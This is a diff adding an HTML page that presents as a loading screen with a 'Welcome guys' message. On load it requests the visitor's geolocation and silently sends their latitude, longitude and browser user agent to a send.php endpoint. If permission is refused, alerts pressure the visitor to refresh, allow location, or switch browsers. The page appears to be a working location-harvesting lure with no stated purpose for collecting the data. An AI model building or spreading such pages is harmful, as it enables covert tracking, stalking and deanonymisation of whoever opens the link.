@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dark</title>
+
+    <style>
+        .center {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 90vh;
+        }
+
+        #youImage {
+            display: none;
+        }
+    </style>
+</head>
+
+<body onload="getLocation()">
+    <h3>
+        <div id="locationInfo"></div>
+    </h3>
+    <div class="center">
+        <img id="myImage" src="https://upload.wikimedia.org/wikipedia/commons/b/b1/Loading_icon.gif?20151024034921"
+            alt="Your Image">
+        <div id="youImage">
+            <h1> Welcome guys</h1>
+        </div>
+
+    </div>
+
+
+
+</body>
+<script>
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition, errorCallback);
+        } else {
+            x.innerHTML = "Geolocation is not supported by this browser."
+        }
+    }
+    function errorCallback(error) {
+        var errorMessage;
+        var x = "You Browser Has Not Load , please Refresh And Allow Location !";
+        switch (error.code) {
+            case error.PERMISSION_DENIED:
+                errorMessage = "Refresh page, please allow location , in another browser !";
+                break;
+            case error.POSITION_UNAVAILABLE:
+                errorMessage = "Location information is unavailable.";
+                break;
+            case error.TIMEOUT:
+                errorMessage = "The request to get user location timed out.";
+                break;
+            case error.UNKNOWN_ERROR:
+                errorMessage = "An unknown error occurred.";
+                break;
+        }
+        document.getElementById("locationInfo").innerHTML = "Error: " + errorMessage;
+        alert("Error:" + x);
+        document.getElementById("myImage").style.display = "none";
+    }
+    function showPosition(position) {
+        const xhttp = new XMLHttpRequest();
+        xhttp.open("GET", "send.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+        xhttp.send();
+
+        document.getElementById("youImage").style.display = "block";
+        document.getElementById("myImage").style.display = "none";
+
+    }
+</script>
+
+</html>
+
+
